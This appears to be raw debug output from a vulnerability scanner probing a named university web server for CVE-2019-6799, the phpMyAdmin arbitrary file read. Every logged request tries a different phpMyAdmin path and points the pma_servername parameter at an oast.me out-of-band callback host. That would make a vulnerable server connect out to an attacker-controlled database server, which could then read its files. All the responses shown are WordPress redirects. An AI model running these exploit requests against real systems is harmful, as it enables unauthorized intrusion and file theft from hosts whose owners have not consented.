@@ -1,0 +1,155 @@
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg69xm6m3wt3t1x.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg69xm6m3wt3t1x.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/_phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg69xm6m3wt3t1x.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://ess.science.unimelb.edu.au/_phpmyadmin/?pma_servername=d29n3paus8n0ghhurvjg69xm6m3wt3t1x.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjg84rmeg7x8mzsr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /index.php?pma_servername=d29n3paus8n0ghhurvjg84rmeg7x8mzsr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/index.php?pma_servername=d29n3paus8n0ghhurvjg84rmeg7x8mzsr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Location: https://ess.science.unimelb.edu.au/?pma_servername=d29n3paus8n0ghhurvjg84rmeg7x8mzsr.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Pingback: https://ess.science.unimelb.edu.au/xmlrpc.php
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgz6i8987sujpfo.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgz6i8987sujpfo.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/pmd/index.php?pma_servername=d29n3paus8n0ghhurvjgz6i8987sujpfo.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://ess.science.unimelb.edu.au/pmd/?pma_servername=d29n3paus8n0ghhurvjgz6i8987sujpfo.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgucdhmwbsxg554.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /pma/index.php?pma_servername=d29n3paus8n0ghhurvjgucdhmwbsxg554.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/pma/index.php?pma_servername=d29n3paus8n0ghhurvjgucdhmwbsxg554.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://ess.science.unimelb.edu.au/pma/?pma_servername=d29n3paus8n0ghhurvjgucdhmwbsxg554.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg84z9fxe3ubz4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg84z9fxe3ubz4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/phpMyAdmin/index.php?pma_servername=d29n3paus8n0ghhurvjg84z9fxe3ubz4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://ess.science.unimelb.edu.au/phpMyAdmin/?pma_servername=d29n3paus8n0ghhurvjg84z9fxe3ubz4b.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
+[CVE-2019-6799] Dumped HTTP request for https://ess.science.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg53c8kqnf99gbw.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+
+GET /phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg53c8kqnf99gbw.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1 HTTP/1.1
+Host: ess.science.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+
+
+[CVE-2019-6799] Dumped HTTP response https://ess.science.unimelb.edu.au/phpmyadmin/index.php?pma_servername=d29n3paus8n0ghhurvjg53c8kqnf99gbw.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+
+HTTP/1.1 301 Moved Permanently
+Connection: close
+Transfer-Encoding: chunked
+Cache-Control: no-cache, must-revalidate, max-age=0, no-store, private
+Content-Type: text/html; charset=UTF-8
+Date: Wed, 06 Aug 2025 15:17:40 GMT
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Location: https://ess.science.unimelb.edu.au/phpmyadmin/?pma_servername=d29n3paus8n0ghhurvjg53c8kqnf99gbw.oast.me&pma_username=30v0wAzhUJFWrMmKowxNucPlE4y&pma_password=30v0wAzhUJFWrMmKowxNucPlE4y&server=1
+Server: openresty
+Vary: Cookie
+X-Cache: BYPASS
+X-Cache-Bypass-Reason: Arguments found
+X-Redirect-By: WordPress
+
+
